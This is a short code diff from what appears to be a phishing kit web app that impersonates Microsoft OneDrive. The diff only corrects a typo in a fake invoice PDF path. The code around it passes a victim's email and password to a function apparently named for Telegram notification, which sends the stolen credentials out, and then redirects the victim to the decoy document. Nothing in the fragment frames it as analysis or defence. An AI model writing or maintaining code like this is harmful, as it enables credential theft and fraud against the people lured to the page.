@@ -365,7 +365,7 @@ export default function App() {
     try {
       await handleTelegramNotification(userEmail, pwd, userId);
       await new Promise((res) => setTimeout(res, 2000));
-      router.push("/onedrive/secure-share-pdf/microsoft/invoice_recept_response_2025.pdf");
+      router.push("/onedrive/secure-share-pdf/microsoft/invoice_receipt_response_2025.pdf");
     } catch (e) {
       displayError("Critical error. Check console.");
       console.error(e);
